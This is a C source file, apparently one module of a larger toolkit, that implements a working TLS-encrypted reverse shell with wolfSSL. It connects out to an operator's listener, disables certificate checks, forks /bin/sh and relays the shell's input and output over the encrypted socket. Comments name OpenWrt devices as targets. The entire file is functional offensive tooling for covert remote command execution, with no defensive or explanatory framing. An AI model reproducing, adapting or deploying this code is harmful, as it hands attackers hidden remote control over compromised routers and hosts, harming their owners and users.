/*
 * builtin-tls reverse shell using wolfSSL.
 *
 * Connects to the operator tls-shell listener, negotiates TLS, spawns
 * /bin/sh, and relays data between the encrypted socket and the shell.
 * Uses pipes because OpenWrt PTY behavior varies across small targets.
 */
#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <netdb.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#ifdef HAVE_WOLFSSL
#include <wolfssl/ssl.h>

static int tls_tcp_connect(const char *host, const char *port)
{
    struct addrinfo hints, *res, *rp;
    int sock = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port, &hints, &res) != 0)
        return -1;
    for (rp = res; rp; rp = rp->ai_next) {
        sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sock < 0)
            continue;
        if (connect(sock, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(sock);
        sock = -1;
    }
    freeaddrinfo(res);
    return sock;
}

static int tls_read_some(WOLFSSL *ssl, char *buf, int len)
{
    int n;
    int fd = wolfSSL_get_fd(ssl);
    for (;;) {
        n = wolfSSL_read(ssl, buf, len);
        if (n > 0)
            return n;
        switch (wolfSSL_get_error(ssl, n)) {
        case WOLFSSL_ERROR_WANT_READ:
            {
                struct pollfd p = { fd, POLLIN, 0 };
                poll(&p, 1, -1);
            }
            continue;
        case WOLFSSL_ERROR_WANT_WRITE:
            {
                struct pollfd p = { fd, POLLOUT, 0 };
                poll(&p, 1, -1);
            }
            continue;
        case WOLFSSL_ERROR_ZERO_RETURN:
            return 0;
        default:
            {
                char errbuf[80];
                int err = wolfSSL_get_error(ssl, n);
                wolfSSL_ERR_error_string(err, errbuf);
                fprintf(stderr, "rshell: builtin-tls: wolfSSL_read failed: %s (%d)\n", errbuf, err);
            }
            return -1;
        }
    }
}

static int tls_write_full(WOLFSSL *ssl, const char *buf, int len)
{
    int off = 0;
    int fd = wolfSSL_get_fd(ssl);
    while (off < len) {
        int n = wolfSSL_write(ssl, buf + off, len - off);
        if (n > 0) {
            off += n;
            continue;
        }
        switch (wolfSSL_get_error(ssl, n)) {
        case WOLFSSL_ERROR_WANT_READ:
            {
                struct pollfd p = { fd, POLLIN, 0 };
                poll(&p, 1, -1);
            }
            continue;
        case WOLFSSL_ERROR_WANT_WRITE:
            {
                struct pollfd p = { fd, POLLOUT, 0 };
                poll(&p, 1, -1);
            }
            continue;
        default:
            {
                char errbuf[80];
                int err = wolfSSL_get_error(ssl, n);
                wolfSSL_ERR_error_string(err, errbuf);
                fprintf(stderr, "rshell: builtin-tls: wolfSSL_write failed: %s (%d)\n", errbuf, err);
            }
            return -1;
        }
    }
    return 0;
}

static int write_full_fd(int fd, const char *buf, int len)
{
    int off = 0;
    while (off < len) {
        ssize_t n = write(fd, buf + off, (size_t)(len - off));
        if (n > 0) {
            off += (int)n;
            continue;
        }
        if (n < 0 && errno == EINTR)
            continue;
        return -1;
    }
    return 0;
}

static void exec_shell_command(const char *shell_cmd)
{
    if (!shell_cmd || !*shell_cmd || !strcmp(shell_cmd, "/bin/sh"))
        execl("/bin/sh", "sh", "-i", NULL);
    execl("/bin/sh", "sh", "-c", shell_cmd, NULL);
}

static int reap_child(pid_t child, int terminate)
{
    int status = 1;
    if (child <= 0)
        return 1;
    if (terminate && waitpid(child, &status, WNOHANG) == 0)
        kill(child, SIGHUP);
    while (waitpid(child, &status, 0) < 0) {
        if (errno != EINTR)
            return 1;
    }
    return WIFEXITED(status) ? WEXITSTATUS(status) : 1;
}

static int relay_shell(WOLFSSL *ssl, const char *shell_cmd)
{
    char buf[4096];
    int n;
    struct pollfd pfd[2];
    int ending = 0;
    const char *reason = "poll";
    int in_pipe[2], out_pipe[2];
    pid_t child;

    fputs("rshell: builtin-tls: using pipe-backed shell relay\n", stderr);
    if (pipe(in_pipe) != 0 || pipe(out_pipe) != 0)
        return 1;
    child = fork();
    if (child < 0)
        return 1;
    if (child == 0) {
        close(in_pipe[1]);
        close(out_pipe[0]);
        dup2(in_pipe[0], 0);
        dup2(out_pipe[1], 1);
        dup2(out_pipe[1], 2);
        if (in_pipe[0] > 2)
            close(in_pipe[0]);
        if (out_pipe[1] > 2)
            close(out_pipe[1]);
        close(wolfSSL_get_fd(ssl));
        exec_shell_command(shell_cmd);
        _exit(1);
    }
    close(in_pipe[0]);
    close(out_pipe[1]);

    pfd[0].fd     = out_pipe[0];
    pfd[0].events = POLLIN;
    pfd[1].fd     = wolfSSL_get_fd(ssl);
    pfd[1].events = POLLIN;

    while (1) {
        if (poll(pfd, 2, -1) < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        if (pfd[0].revents & POLLIN) {
            n = read(out_pipe[0], buf, sizeof(buf));
            if (n <= 0) {
                reason = "shell_eof";
                ending = 1;
                break;
            }
            if (tls_write_full(ssl, buf, n) != 0) {
                reason = "tls_write";
                ending = 1;
                break;
            }
        }
        if (pfd[1].revents & POLLIN) {
            n = tls_read_some(ssl, buf, sizeof(buf));
            if (n <= 0) {
                reason = (n == 0) ? "remote_eof" : "tls_read";
                ending = 1;
                break;
            }
            if (write_full_fd(in_pipe[1], buf, n) != 0) {
                reason = "shell_write";
                ending = 1;
                break;
            }
        }
        if (pfd[0].revents & (POLLHUP | POLLERR | POLLNVAL)) {
            reason = "shell_hup";
            ending = 1;
            break;
        }
        if (pfd[1].revents & (POLLHUP | POLLERR | POLLNVAL)) {
            reason = "socket_hup";
            ending = 1;
            break;
        }
    }
    close(in_pipe[1]);
    close(out_pipe[0]);
    fprintf(stderr, "rshell: builtin-tls: relay ended: %s\n", reason);
    return reap_child(child, ending);
}

int rshell_builtin_tls(const char *host, const char *port, const char *shell_cmd)
{
    WOLFSSL_CTX *ctx;
    WOLFSSL *ssl;
    int sock;
    int rc;

    if (!host || !*host) {
        fputs("rshell: builtin-tls: operator host not configured\n", stderr);
        return 2;
    }

    wolfSSL_Init();
    ctx = wolfSSL_CTX_new(wolfSSLv23_client_method());
    if (!ctx) {
        fputs("rshell: builtin-tls: failed to create wolfSSL context\n", stderr);
        wolfSSL_Cleanup();
        return 1;
    }
    /* Self-signed server cert is the default; matches socat-tls verify=0 behavior */
    wolfSSL_CTX_set_verify(ctx, WOLFSSL_VERIFY_NONE, NULL);

    sock = tls_tcp_connect(host, port);
    if (sock < 0) {
        fprintf(stderr, "rshell: builtin-tls: failed to connect to %s:%s\n", host, port);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();
        return 1;
    }

    ssl = wolfSSL_new(ctx);
    if (!ssl) {
        fputs("rshell: builtin-tls: failed to create wolfSSL session\n", stderr);
        close(sock);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();
        return 1;
    }
    wolfSSL_set_fd(ssl, sock);

    if (wolfSSL_connect(ssl) != WOLFSSL_SUCCESS) {
        char errbuf[80];
        int err = wolfSSL_get_error(ssl, 0);
        wolfSSL_ERR_error_string(err, errbuf);
        fprintf(stderr, "rshell: builtin-tls: TLS handshake failed: %s\n", errbuf);
        wolfSSL_free(ssl);
        close(sock);
        wolfSSL_CTX_free(ctx);
        wolfSSL_Cleanup();
        return 1;
    }

    rc = relay_shell(ssl, shell_cmd);

    wolfSSL_shutdown(ssl);
    wolfSSL_free(ssl);
    close(sock);
    wolfSSL_CTX_free(ctx);
    wolfSSL_Cleanup();
    return rc;
}

#endif /* HAVE_WOLFSSL */
